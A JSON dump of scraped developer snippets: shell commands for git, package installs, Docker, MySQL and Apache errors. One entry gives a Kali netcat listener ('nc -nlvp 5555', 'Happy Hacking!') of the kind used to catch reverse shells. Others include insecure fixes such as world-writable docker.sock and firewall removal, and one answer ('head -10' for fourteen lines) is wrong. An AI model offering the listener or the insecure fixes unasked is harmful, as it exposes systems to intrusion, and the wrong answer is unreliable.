    "id": 160,
    "keyword": null,
    "link": null,
    "title": " Git change remote branch name",
    "description": "# Rename the local branch to the new name git branch -m <old_name> <new_name>  # Delete the old branch on remote - where <remote> is, for example, origin git push <remote> --delete <old_name>  # Or shorter way to delete remote branch [:] git push <remote> :<old_name>  # Push the new branch to remote git push <remote> <new_name>  # Reset the upstream branch for the new_name local branch git push <remote> -u <new_name> \ngit branch &ndash;m old-name new-name\n1. Verify the local branch has the correct name: git branch -a  2. Next, delete the branch with the old name on the remote repository: git push origin &ndash;&ndash;delete old-name  3. Finally, push the branch with the correct name, and reset the upstream branch: git push origin &ndash;u new-name  Alternatively, you can overwrite the remote branch with a single command: git push origin :old-name new-name Resetting the upstream branch is still required: git push origin &ndash;u new-name\n$ git checkout Branch-Name-You-Want-to-Change $ git branch -m New-Branch-Name\ngit branch -m <newname> \ngit push origin :<branch_to_rename> git checkout -b <new_branch_name> git push --set-upstream origin <new_branch_name>\n",
    "reg_date": "2021-10-11T22:00:14.000Z"
  },
  {
    "id": 161,
    "keyword": null,
    "link": null,
    "title": " Git is not working after macOS Update (xcrun: error: invalid active developer path (/Library/Developer/CommandLineTools)",
    "description": "xcode-select --install \n",
    "reg_date": "2021-10-11T22:00:15.000Z"
  },
  {
    "id": 162,
    "keyword": null,
    "link": null,
    "title": " Github Identification on terminal",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n",
    "reg_date": "2021-10-11T22:00:15.000Z"
  },
  {
    "id": 163,
    "keyword": null,
    "link": null,
    "title": " Got an error creating the test database: ERREUR: droit refusé pour créer une base de données",
    "description": "#When Django runs the test suite, it creates a new database, in your case test_finance. The postgres user with username django does not have permission to create a database, hence the error message.  #When you run migrate or syncdb, Django does not try to create the finance database, so you don't get any errors.  #You can add the createdb permission to the django user by running the following command in the postgres shell as a superuser  #connect to postgres ALTER USER user_name CREATEDB;  #change user_name by your username\n",
    "reg_date": "2021-10-11T22:00:15.000Z"
  },
  {
    "id": 164,
    "keyword": null,
    "link": null,
    "title": " Got error: 1698: Access denied for user 'root'@'localhost' when trying to connect",
    "description": ">>> sudo mysql -u root -p  >>> USE mysql;  >>> UPDATE user SET plugin='mysql_native_password' WHERE User ='root';  >>> FLUSH PRIVILEGES;  >>> exit;  >>> service mysql restart; \n$ sudo mysql -u root # I had to use \"sudo\" since is new installation  mysql> USE mysql; mysql> UPDATE user SET plugin='mysql_native_password' WHERE User='root'; mysql> FLUSH PRIVILEGES; mysql> exit;  $ service mysql restart\n",
    "reg_date": "2021-10-11T22:00:15.000Z"
  },
  {
    "id": 165,
    "keyword": null,
    "link": null,
    "title": " Got permission denied while trying to connect to the Docker daemon socket",
    "description": "sudo chmod 666 /var/run/docker.sock  \nsudo usermod -aG docker ${USER} \nsudo chmod 666 /var/run/docker.sock \nsudo usermod -a -G docker $USER \n$ sudo groupadd docker \nsudo newgroup docker sudo chmod 666 /var/run/docker.sock sudo usermod -aG docker ${USER}\n",
    "reg_date": "2021-10-11T22:00:16.000Z"
  },
  {
    "id": 166,
    "keyword": null,
    "link": null,
    "title": " Grunt--install cli",
    "description": "npm install -g grunt-cli\n",
    "reg_date": "2021-10-11T22:00:16.000Z"
  },
  {
    "id": 167,
    "keyword": null,
    "link": null,
    "title": " Habilitar la ejecución de scripts para Powershell",
    "description": "'Abrimos el Windows PowerShell como administrador y ejecutamos:' Get-ExecutionPolicy 'Nos tendr&iacute;a que devolver &laquo;restricted&raquo;. (Restringido)' 'Para cambiar esta configuraci&oacute;n basta con ejecutar:' Set-ExecutionPolicy Unrestricted\n",
    "reg_date": "2021-10-11T22:00:16.000Z"
  },
  {
    "id": 168,
    "keyword": null,
    "link": null,
    "title": " Homebrew PHP appears not to be linked. Please run [valet use php@X.Y]",
    "description": "#Find the PHP version brew list #In my case it was php@7.4, then brew link php@7.4 --force --overwrite #Now, install valet valet install\n",
    "reg_date": "2021-10-11T22:00:16.000Z"
  },
  {
    "id": 169,
    "keyword": null,
    "link": null,
    "title": " How To Update ionic",
    "description": "npm uninstall -g ionic  npm install -g ionic \n",
    "reg_date": "2021-10-11T22:00:17.000Z"
  },
  {
    "id": 170,
    "keyword": null,
    "link": null,
    "title": " How can i rename my local master branch to main ?",
    "description": "$ git branch -m master main \n",
    "reg_date": "2021-10-11T22:00:17.000Z"
  },
  {
    "id": 171,
    "keyword": null,
    "link": null,
    "title": " How can you identify zombie processes on the Linux system",
    "description": "Zombie processes can be found easily with the ps -l command.  Within the ps output there is a STAT column which will show the  processes current status, a zombie process will have Z as the status.  In addition to the STAT column zombies commonly have the words  <defunct> in the CMD column as well.\n",
    "reg_date": "2021-10-11T22:00:17.000Z"
  },
  {
    "id": 172,
    "keyword": null,
    "link": null,
    "title": " How can you only see the first 14 lines of a file?- answer",
    "description": "head -10 bar.txt\n",
    "reg_date": "2021-10-11T22:00:17.000Z"
  },
  {
    "id": 173,
    "keyword": null,
    "link": null,
    "title": " How do I check my WSL version?",
    "description": "wsl -l -v\n",
    "reg_date": "2021-10-11T22:00:17.000Z"
  },
  {
    "id": 174,
    "keyword": null,
    "link": null,
    "title": " How do I see which version of Swift I'm using",
    "description": "// Open the Terminal and write:  swift -version \n",
    "reg_date": "2021-10-11T22:00:17.000Z"
  },
  {
    "id": 175,
    "keyword": null,
    "link": null,
    "title": " How do I show the changes which have been staged",
    "description": "git diff --staged # or you can use --cached (they are synoyms, see the source)\n",
    "reg_date": "2021-10-11T22:00:18.000Z"
  },
  {
    "id": 176,
    "keyword": null,
    "link": null,
    "title": " How do I sync local and remote branches?",
    "description": "git fetch --prune origin git reset --hard origin/master git clean -f -d \nmaybe you're lokking for git pull origin master or git pull origin main or  git pull origin <branchname>\n",
    "reg_date": "2021-10-11T22:00:18.000Z"
  },
  {
    "id": 177,
    "keyword": null,
    "link": null,
    "title": " How to Install Julia on Ubuntu",
    "description": "# How does the last version Julia install in Ubuntu 16.04 or above?  # Wget Magic # Copy and paste on your favorite linux console :) cd ~/Downloads && wget -q -O- https://julialang.org/downloads/ | grep -Po '(?<=href=\")[^\"]*' | grep https://julialang-s3.julialang.org/bin/linux/x64/ | head -1 | xargs wget -O julia-x86_64.tar.gz && mkdir julia-x86_64 && tar -xvzf julia-x86_64.tar.gz -C julia-x86_64 --strip-components 1 && sudo cp -r julia-x86_64 /opt/ && sudo ln -s /opt/julia-x86_64/bin/julia /usr/local/bin/julia && julia\nsudo apt-get update -y sudo apt-get install -y julia  julia\n",
    "reg_date": "2021-10-11T22:00:18.000Z"
  },
  {
    "id": 178,
    "keyword": null,
    "link": null,
    "title": " How to call one shell script from another shell script?",
    "description": " #!/bin/bash  #By Andrei Krasutski  SCRIPT_PATH=\"/path/to/script.sh\"  # Here you execute your script \"$SCRIPT_PATH\"  # or . \"$SCRIPT_PATH\"  # or source \"$SCRIPT_PATH\"  # or bash \"$SCRIPT_PATH\"  # or eval '\"$SCRIPT_PATH\"'  # or OUTPUT=$(\"$SCRIPT_PATH\") echo $OUTPUT  # or OUTPUT=`\"$SCRIPT_PATH\"` echo $OUTPUT  # or (\"$SCRIPT_PATH\")  # or (exec \"$SCRIPT_PATH\")\n",
    "reg_date": "2021-10-11T22:00:18.000Z"
  },
  {
    "id": 179,
    "keyword": null,
    "link": null,
    "title": " How to change git author",
    "description": "# For one commit git commit --amend --author=\"Author Name <email@address.com>\"  # for multiple commits git rebase -i B  #if you need to edit A, use  git rebase -i --root #change the lines for both C and D from pick to edit #Once the rebase started, it would first pause at C You would  git commit --amend --author=\"Author Name <email@address.com>\" #Then  git rebase --continue #It would pause again at D #Then you would  git commit --amend --author=\"Author Name <email@address.com>\" #again git rebase --continue #The rebase would complete. #Use  git push -f #to update your origin with the updated commits. \ngit commit --amend --author=\"Author Name <email@address.com>\" --no-edit \n",
    "reg_date": "2021-10-11T22:00:18.000Z"
  },
  {
    "id": 180,
    "keyword": null,
    "link": null,
    "title": " How to change tab size on GitHub?",
    "description": "You can append ?ts=2 or ?ts=4 to the URL to change the tab-size.\n",
    "reg_date": "2021-10-11T22:00:19.000Z"
  },
  {
    "id": 181,
    "keyword": null,
    "link": null,
    "title": " How to check git config username?",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\ngit config user.name \ngit config --list \n3) Look in your Git configuration file Finally, you can also see your Git username in the Git configuration file in your HOME directory on Unix systems, i.e., this file:  ~/.gitconfig\n",
    "reg_date": "2021-10-11T22:00:19.000Z"
  },
  {
    "id": 182,
    "keyword": null,
    "link": null,
    "title": " How to check the installed version of React-Native",
    "description": "react-native info //or ing npm install -->JargonAprV2 git:(master) x react-native -v react-native-cli: 0.1.10 react-native : 0.24.1 npm install -g yarn : incase yarn internal or external command\t   npm install -g serve : installing npm globaly serve -s build  --------------------------------- npm install -g react-native-cli react-native init AwesomeProject ---------------------------------\n",
    "reg_date": "2021-10-11T22:00:19.000Z"
  },
  {
    "id": 183,
    "keyword": null,
    "link": null,
    "title": " How to count number of files in each directory",
    "description": "du -a | cut -d/ -f2 | sort | uniq -c | sort -nr\n",
    "reg_date": "2021-10-11T22:00:19.000Z"
  },
  {
    "id": 184,
    "keyword": null,
    "link": null,
    "title": " How to create a file with a given size in Linux?",
    "description": "dd if=/dev/zero of=upload_test bs=1M count=size_in_megabytes\ndd if=/dev/zero of=upload_test bs=file_size count=1\n",
    "reg_date": "2021-10-11T22:00:19.000Z"
  },
  {
    "id": 185,
    "keyword": null,
    "link": null,
    "title": " How to export a GPG public key to a file",
    "description": "gpg --output public.pgp --armor --export username@email\n",
    "reg_date": "2021-10-11T22:00:20.000Z"
  },
  {
    "id": 186,
    "keyword": null,
    "link": null,
    "title": " How to find cmake version in ubuntu?",
    "description": "cmake --version\n",
    "reg_date": "2021-10-11T22:00:20.000Z"
  },
  {
    "id": 187,
    "keyword": null,
    "link": null,
    "title": " How to get the latest powershell update",
    "description": "Install-Module -Name PowerShellGet -Force Exit \n",
    "reg_date": "2021-10-11T22:00:20.000Z"
  },
  {
    "id": 188,
    "keyword": null,
    "link": null,
    "title": " How to install Visual Studio Code on Ubuntu",
    "description": "//Step 1:  sudo apt update sudo apt install software-properties-common apt-transport-https wgetCopyCopy //Step 2: wget -q https://packages.microsoft.com/keys/microsoft.asc -O-| sudo apt-key add - //Step 3: sudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\" //Step 4 sudo apt install code.   \nsudo add-apt-repository \"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main\"\n",
    "reg_date": "2021-10-11T22:00:20.000Z"
  },
  {
    "id": 189,
    "keyword": null,
    "link": null,
    "title": " How to install heroku for web development",
    "description": "$ npm install -g heroku \n",
    "reg_date": "2021-10-11T22:00:20.000Z"
  },
  {
    "id": 190,
    "keyword": null,
    "link": null,
    "title": " How to install laravel with specified version",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\n",
    "reg_date": "2021-10-11T22:00:20.000Z"
  },
  {
    "id": 191,
    "keyword": null,
    "link": null,
    "title": " How to install npm in centos",
    "description": "curl -sL https://rpm.nodesource.com/setup_10.x | sudo bash - sudo yum install nodejs\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash source ~/.bash_profile nvm list-remote\n",
    "reg_date": "2021-10-11T22:00:21.000Z"
  },
  {
    "id": 192,
    "keyword": null,
    "link": null,
    "title": " How to install terraform macOS with brew",
    "description": "brew install terraform\n",
    "reg_date": "2021-10-11T22:00:21.000Z"
  },
  {
    "id": 193,
    "keyword": null,
    "link": null,
    "title": " How to kill a port",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \n#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nnpx kill-port 8080 \nnetstat -ano | findstr :<PORT> taskkill //PID <PID> //F OR taskkill /PID <PID> /F\nkill $(lsof -t -i:8080) //kill port 8080\n# To list any process listening to the port 8080: lsof -i:8080  # To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  # or more violently: kill -9 $(lsof -t -i:8080) # (-9 corresponds to the SIGKILL - terminate immediately/hard kill signal: see List of Kill Signals and What is the purpose of the -9 option in the kill command?. If no signal is specified to kill, the TERM signal a.k.a. -15 or soft kill is sent, which sometimes isn't enough to kill a process.).\n",
    "reg_date": "2021-10-11T22:00:21.000Z"
  },
  {
    "id": 194,
    "keyword": null,
    "link": null,
    "title": " How to kill all tmux sessions (or at least multiple sessions) from the CLI?",
    "description": "tmux kill-server\n",
    "reg_date": "2021-10-11T22:00:21.000Z"
  },
  {
    "id": 195,
    "keyword": null,
    "link": null,
    "title": " How to remove Spacevim",
    "description": "curl -sLf https://spacevim.org/install.sh | bash -s -- --uninstall\n",
    "reg_date": "2021-10-11T22:00:21.000Z"
  },
  {
    "id": 196,
    "keyword": null,
    "link": null,
    "title": " How to restart Ubuntu via SSH?",
    "description": "sudo service ssh restart\n",
    "reg_date": "2021-10-11T22:00:21.000Z"
  },
  {
    "id": 197,
    "keyword": null,
    "link": null,
    "title": " How to revert uncommitted changes including files and folders?",
    "description": "# If you want to revert the changes only in current working directory git checkout -- .  # discard anything (note: you have to be in the directory # where all of the changes are located) # or you can use the command on line 9, you can discard anything # on the repo git checkout -- * git checkout -- :/  # or if you check the git status message after modifying a file  # there is this command  git restore <file>\n",
    "reg_date": "2021-10-11T22:00:22.000Z"
  },
  {
    "id": 198,
    "keyword": null,
    "link": null,
    "title": " How to run batch file and dellete it",
    "description": "@echo off set mypath=%cd% start %mypath%\\filename here  del %mypath%\\batcfilename.bat exit  \n",
    "reg_date": "2021-10-11T22:00:22.000Z"
  },
  {
    "id": 199,
    "keyword": null,
    "link": null,
    "title": " How to see all the extension installed in visual studio code",
    "description": "code --list-extensions --show-versions \n",
    "reg_date": "2021-10-11T22:00:22.000Z"
  },
  {
    "id": 200,
    "keyword": null,
    "link": null,
    "title": " How to start apache2 server",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop\n# Start Apache 2 server on Linux/Unix sudo service apache2 start\nsystemctl status apache2\n",
    "reg_date": "2021-10-11T22:00:22.000Z"
  },
  {
    "id": 201,
    "keyword": null,
    "link": null,
    "title": " How to upload a files to a repository on github using gitbash",
    "description": "git init git add . git commit -m \"message for the commit\" git remote add origin https://url-of-github-repo git push origin master or git push -f origin master\ngit add . git commit -m \"message for the commit\" git remote add origin https://url-of-github-repo git push origin master\n",
    "reg_date": "2021-10-11T22:00:23.000Z"
  },
  {
    "id": 202,
    "keyword": null,
    "link": null,
    "title": " IP adress terminal",
    "description": "# when you're on your terminal Window :  ipconfig  # on macOS :  ifconfig | grep \"inet\" | grep -v 127.0.0.1  # on Linux :   hostname -I\n",
    "reg_date": "2021-10-11T22:00:23.000Z"
  },
  {
    "id": 203,
    "keyword": null,
    "link": null,
    "title": " Install / Update Dbeaver Community on Ubuntu",
    "description": "sudo add-apt-repository ppa:serge-rider/dbeaver-ce sudo apt-get update sudo apt-get install dbeaver-ce\n",
    "reg_date": "2021-10-11T22:00:23.000Z"
  },
  {
    "id": 204,
    "keyword": null,
    "link": null,
    "title": " Install AdonisJS",
    "description": "npm i -g @adonisjs/cli\n> npm i -g @adonisjs/cli\n",
    "reg_date": "2021-10-11T22:00:23.000Z"
  },
  {
    "id": 205,
    "keyword": null,
    "link": null,
    "title": " Install Figma in Linux",
    "description": "sudo snap install figma-linux\n",
    "reg_date": "2021-10-11T22:00:23.000Z"
  },
  {
    "id": 206,
    "keyword": null,
    "link": null,
    "title": " Install Peer Dependencies",
    "description": "npm i install-peers -D\n",
    "reg_date": "2021-10-11T22:00:23.000Z"
  },
  {
    "id": 207,
    "keyword": null,
    "link": null,
    "title": " Install ansible",
    "description": "On Fedora: $ sudo dnf install ansible  On RHEL and CentOS: $ sudo yum install ansible  On Ubuntu: $ sudo apt-add-repository --yes --update ppa:ansible/ansible $ sudo apt install ansible  Using PIP: $ pip install --user ansible  On Alpine: $ apk add ansible \n# Installation is simpler if you use root account $ sudo -s  # remove prior versions of ansible incase you have it root@ip-172---:/ pip uninstall ansible  # remove any ansible installed by apt root@ip-172---:/ apt remove ansible  # now install it using pip root@ip-172---:/ pip install ansible  # check for the version of ansible root@ip-172---:/ ansible --version \n",
    "reg_date": "2021-10-11T22:00:23.000Z"
  },
  {
    "id": 208,
    "keyword": null,
    "link": null,
    "title": " Install cassandra",
    "description": "sudo apt update sudo apt install openjdk-8-jdk -y java -version sudo apt install apt-transport-https sudo sh -c 'echo \"deb http://www.apache.org/dist/cassandra/debian 40x main\" > /etc/apt/sources.list.d/cassandra.list' wget -q -O - https://www.apache.org/dist/cassandra/KEYS | sudo apt-key add - sudo apt update sudo apt install cassandra nodetool status sudo systemctl status cassandra \n",
    "reg_date": "2021-10-11T22:00:24.000Z"
  },
  {
    "id": 209,
    "keyword": null,
    "link": null,
    "title": " Install cpanel on upcloud",
    "description": "yum update -y  hostname server.example.com  nano /etc/sysconfig/network-scripts/ifcfg-eth0  #_for_upcloud       DEVICE=eth0       BOOTPROTO=static       ONBOOT=yes       IPADDR=185.20.139.167       NETMASK=255.255.252.0       GATEWAY=185.20.136.1        ip link set eth0 down && ip link set eth0 up  systemctl stop NetworkManager systemctl disable NetworkManager  yum remove NetworkManager -y  systemctl stop firewalld systemctl disable firewalld  yum remove firewalld -y  cd /home && curl -o latest -L https://securedownloads.cpanel.net/latest && sh latest\n",
    "reg_date": "2021-10-11T22:00:24.000Z"
  },
  {
    "id": 210,
    "keyword": null,
    "link": null,
    "title": " Install dia for linux ubuntu",
    "description": "sudo apt update sudo apt install dia\n",
    "reg_date": "2021-10-11T22:00:24.000Z"
  },
  {
    "id": 211,
    "keyword": null,
    "link": null,
    "title": " Install docker with apt command",
    "description": "$ sudo apt-get update $ sudo apt install docker-ce -y\n",
    "reg_date": "2021-10-11T22:00:24.000Z"
  },
  {
    "id": 212,
    "keyword": null,
    "link": null,
    "title": " Install for [ 'create-react-app@latest' ] failed with code 1",
    "description": "npm install -g create-react-app     npx create-react-app my-app      cd my-app       npm start      \nUse these two commands to fix the problem.  npm install -g create-react-app     npx create-react-app my-app  \n",
    "reg_date": "2021-10-11T22:00:24.000Z"
  },
  {
    "id": 213,
    "keyword": null,
    "link": null,
    "title": " Install terminator Ubuntu 20.04",
    "description": "sudo apt install terminator\n",
    "reg_date": "2021-10-11T22:00:24.000Z"
  },
  {
    "id": 214,
    "keyword": null,
    "link": null,
    "title": " Install xlrd >= 1.0.0 for Excel support Use pip or conda to install xlrd",
    "description": "pip install xlrd  //if you are using conda conda install -c anaconda xlrd\n",
    "reg_date": "2021-10-11T22:00:25.000Z"
  },
  {
    "id": 215,
    "keyword": null,
    "link": null,
    "title": " Installation failed: Download failed. Destination directory for file streaming does not exist or is not writable.",
    "description": "define('WP_TEMP_DIR', ABSPATH . 'wp-content/');\n",
    "reg_date": "2021-10-11T22:00:25.000Z"
  },
  {
    "id": 216,
    "keyword": null,
    "link": null,
    "title": " Installl adb to linux",
    "description": "sudo apt-get install adb\n",
    "reg_date": "2021-10-11T22:00:25.000Z"
  },
  {
    "id": 217,
    "keyword": null,
    "link": null,
    "title": " Invalid command 'Header', perhaps misspelled or",
    "description": "a2enmod headers && apache2ctl restart #then restart apache2: /etc/init.d/apache2 restart\n",
    "reg_date": "2021-10-11T22:00:26.000Z"
  },
  {
    "id": 218,
    "keyword": null,
    "link": null,
    "title": " Invalid command 'ProxyPass',",
    "description": "sudo a2enmod proxy_http\n",
    "reg_date": "2021-10-11T22:00:26.000Z"
  },
  {
    "id": 219,
    "keyword": null,
    "link": null,
    "title": " Invalid command 'ProxyPass', perhaps misspelled or defined by a module not included in the server configuratio",
    "description": "Run: sudo a2enmod proxy_http\n",
    "reg_date": "2021-10-11T22:00:26.000Z"
  },
  {
    "id": 220,
    "keyword": null,
    "link": null,
    "title": " Invalid command 'RewriteEngine'",
    "description": "a2enmod rewrite systemctl restart apache2\n",
    "reg_date": "2021-10-11T22:00:26.000Z"
  },
  {
    "id": 221,
    "keyword": null,
    "link": null,
    "title": " Invalid command 'SSLEngine', perhaps misspelled or defined by a module not included",
    "description": "sudo a2enmod ssl && service apache2 restart\n",
    "reg_date": "2021-10-11T22:00:26.000Z"
  },
  {
    "id": 222,
    "keyword": null,
    "link": null,
    "title": " JSX element implicitly has type 'any' because no interface 'JSX.IntrinsicElements' exists.ts(7026)",
    "description": "npm i -save -D @types/react  yarn add --dev @types/react\n",
    "reg_date": "2021-10-11T22:00:27.000Z"
  },
  {
    "id": 223,
    "keyword": null,
    "link": null,
    "title": " Jwt Authentication error Argument 3 passed to Lcobucci\\JWT\\Signer\\Hmac::doVerify()",
    "description": "#Here's complete snippet  php artisan key:generate php artisan jwt:secret php artisan cache:clear php artisan config:clear # Before run above commands make sure there is install jwt package, than check its config file name jwt.php in config folder.  \n",
    "reg_date": "2021-10-11T22:00:27.000Z"
  },
  {
    "id": 224,
    "keyword": null,
    "link": null,
    "title": " Kali linux Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root? virtualbox",
    "description": "Method 1 ps aux | grep -i apt sudo kill -9 <process_id>  Method 2  sudo lsof /var/lib/dpkg/lock sudo lsof /var/lib/apt/lists/lock sudo lsof /var/cache/apt/archives/lock  sudo kill -9 <process_id>  sudo rm /var/lib/apt/lists/lock sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock  sudo dpkg --configure -a  sudo apt update  \nsudo rm /var/lib/apt/lists/lock sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock* sudo dpkg --configure -a sudo apt update\n",
    "reg_date": "2021-10-11T22:00:27.000Z"
  },
  {
    "id": 225,
    "keyword": null,
    "link": null,
    "title": " Key path \"file:///home/user/projectname/storage/oauth-public.key\" does not exist or is not readable",
    "description": "#Install passport composer require laravel/passport  #Register the service provider in config/app.php Laravel\\Passport\\PassportServiceProvider::class,  #Run the migrations php artisan migrate  #Generate key php artisan passport:install\n",
    "reg_date": "2021-10-11T22:00:27.000Z"
  },
  {
    "id": 226,
    "keyword": null,
    "link": null,
    "title": " Keyboard shortcuts in Microsoft Edge",
    "description": "             === Keyboard shortcuts in Microsoft Edge === Ctrl + Shift + B      #Show or hide the favorites bar Ctrl + D              #Save the current tab as a favorite Ctrl + Shift + D\t  #Save all open tabs as favorites in a new folder Alt + D / Ctrl + L\t  #Select the URL in the address bar to edit Ctrl + E\t\t\t  #Open a search query in the address bar Alt + E\t\t\t\t  #Open the Settings and more \"...\" menu Ctrl + F\t\t      #Find on page Ctrl + H\t\t\t  #Open History in a new tab  Ctrl + J\t\t\t  #Open Downloads in a new tab Ctrl + Shift + I\t  #Open Developer Tools Ctrl + Shift + K\t  #Duplicate the current tab Ctrl + S\t\t\t  #Save the current page Ctrl + P\t\t\t  #Print the current page Ctrl + R\t\t\t  #Reload the current page Ctrl + T\t\t\t  #Open a new tab and switch to it Ctrl + U\t\t\t  #View source Ctrl + W\t\t\t  #Close the current tab Ctrl + Plus/ Minus \t  #Zoom in/out F5\t\t\t\t\t  #Reload the current tab F11\t\t\t\t\t  #Enter full screen (toggle) F12\t\t\t\t\t  #Open Developer Tools PgUp\t\t\t\t  #Scroll up webpage, one screen at a time PgDn\t\t\t\t  #Scroll down webpage, one screen at a time Home\t\t\t\t  #Go to the top of the page Ctrl + right click    #Open a link in new tab Press Scroll Wheel    #Open a link in new tab\n",
    "reg_date": "2021-10-11T22:00:27.000Z"
  },
  {
    "id": 227,
    "keyword": null,
    "link": null,
    "title": " Laravel Rolling Back Migrations",
    "description": "php artisan migrate:rollback\nphp artisan migrate:rollback --step=5\n",
    "reg_date": "2021-10-11T22:00:28.000Z"
  },
  {
    "id": 228,
    "keyword": null,
    "link": null,
    "title": " Listener kali linux",
    "description": "Kali Linux Live: Listener kali linux  $nc -nlvp 5555  Happy Hacking!\n",
    "reg_date": "2021-10-11T22:00:28.000Z"
  },
  {
    "id": 229,
    "keyword": null,
    "link": null,
    "title": " Load key \".pem\": bad permissions",
    "description": "chmod 400 ~/.ssh/mykeyfile.pem\n",
    "reg_date": "2021-10-11T22:00:28.000Z"
  },
  {
    "id": 230,
    "keyword": null,
    "link": null,
    "title": " Maatwebsite\\Excel\\Excel not found",
    "description": "composer require maatwebsite/excel:^3.1\n",
    "reg_date": "2021-10-11T22:00:28.000Z"
  },
  {
    "id": 231,
    "keyword": null,
    "link": null,
    "title": " Macbook git user config global",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n",
    "reg_date": "2021-10-11T22:00:28.000Z"
  },
  {
    "id": 232,
    "keyword": null,
    "link": null,
    "title": " Max virtual memory areas vm.max map count [65530] is too low, increase to at least [262144]",
    "description": "# Execute: sudo sysctl -w vm.max_map_count=262144 # Execute: sudo echo 'vm.max_map_count=262144' >> /etc/sysctl.conf\n# Execute: sudo sysctl -w vm.max_map_count=262144 # Execute: sudo echo 'vm.max_map_count=262144' >> /etc/sysctl.conf\n",
    "reg_date": "2021-10-11T22:00:28.000Z"
  },
  {
    "id": 233,
    "keyword": null,
    "link": null,
    "title": " Missing essential plugin: org.jetbrains.android",
    "description": "## Windows 10 --- ## Delete this file C:\\Users\\YourUserName\\AppData\\Roaming\\Google\\AndroidStudioPreview4.X\\disabled_plugins.txt  ## Linux rm -r ~/.config/Google/AndroidStudio4.1 ## Or Remove rm  ~/.config/Google/AndroidStudio4.1/disabled_plugins.txt\n// delete this how to fix this issue  C:\\Users\\anon\\AppData\\Roaming\\Google\\AndroidStudio4.1 \n",
    "reg_date": "2021-10-11T22:00:29.000Z"
  },
  {
    "id": 234,
    "keyword": null,
    "link": null,
    "title": " Missing optional dependency 'xlrd'. Install xlrd >= 1.0.0 for Excel support Use pip or conda to install xlrd.",
    "description": "pip install xlrd  //if you are using conda conda install -c anaconda xlrd\nconda install -c anaconda xlrd \n",
    "reg_date": "2021-10-11T22:00:29.000Z"
  },
  {
    "id": 235,
    "keyword": null,
    "link": null,
    "title": " Model class django.contrib.sites.models.Site doesn't declare an explicit app label and isn't in an application in INSTALLED APPS",
    "description": "Just add 'django.contrib.sites', to INSTALLED_APPS and set SITE_ID = 1 in your settings.py file.\n",
    "reg_date": "2021-10-11T22:00:29.000Z"
  },
  {
    "id": 236,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'RPI'",
    "description": "sudo apt-get install python3-dev python3-rpi.gpio \npip3 install pandas #or pip install pandas   #https://www.fiverr.com/tamerjarrar\npip install gTTS\n",
    "reg_date": "2021-10-11T22:00:29.000Z"
  },
  {
    "id": 237,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named ' pywrap tensorflow'",
    "description": "C:\\> pip install --upgrade https://storage.googleapis.com/tensorflow/windows/cpu/tensorflow-1.0.0-cp35-cp35m-win_amd64.whl \n",
    "reg_date": "2021-10-11T22:00:29.000Z"
  },
  {
    "id": 238,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'allauth'",
    "description": "pip install django-allauth \n",
    "reg_date": "2021-10-11T22:00:29.000Z"
  },
  {
    "id": 239,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'django.db.migrations.migration'",
    "description": "# Django is probably corrupted; reinstall it pip3 uninstall Django pip3 install Django\n",
    "reg_date": "2021-10-11T22:00:30.000Z"
  },
  {
    "id": 240,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'libs.resources'",
    "description": "cd labelImg pyrcc5 -o libs/resources.py resources.qrc\n",
    "reg_date": "2021-10-11T22:00:30.000Z"
  },
  {
    "id": 241,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'psycopg2'",
    "description": "# For quick install pip install psycopg2-binary  # For production-ready install pip install psycopg2 # But it will fail if build prerequesties are not met: # https://www.psycopg.org/docs/install.html#build-prerequisites\npip install psycopg2\npip install tensorflow-hub\npip install psycopg2-binary \n$ pip install psycopg2  # or $ pipenv install psycopg2\n#Use psycopg2-binary instead of psycopg2.  pip install psycopg2-binary \n",
    "reg_date": "2021-10-11T22:00:30.000Z"
  },
  {
    "id": 242,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'pysnmp'",
    "description": "for Windows: python -m ensurepip\npip install matplotlib \npip install pysnmp\n! conda install -c conda-forge nxviz\n",
    "reg_date": "2021-10-11T22:00:30.000Z"
  },
  {
    "id": 243,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'setuptools rust'",
    "description": "To install setuptools on Debian:  sudo apt-get install python3-setuptools For an older version of Python (Python 2.x):  sudo apt-get install python-setuptools\n",
    "reg_date": "2021-10-11T22:00:30.000Z"
  },
  {
    "id": 244,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'tensorflow addons'",
    "description": "pip install tensorflow-addons\n",
    "reg_date": "2021-10-11T22:00:30.000Z"
  },
  {
    "id": 245,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'tensorflow hub'",
    "description": "pip install tensorflow-hub\n",
    "reg_date": "2021-10-11T22:00:31.000Z"
  },
  {
    "id": 246,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'virtualenv.seed.embed.via app data'",
    "description": "# create the virtual environment using directly venv module python3 -m venv my_env\npython3 -m venv my_env \nModuleNotFoundError: No module named &lsquo;virtualenv.seed.embed.via_app_data&rsquo; when I created new env by virtualenv\n",
    "reg_date": "2021-10-11T22:00:31.000Z"
  },
  {
    "id": 247,
    "keyword": null,
    "link": null,
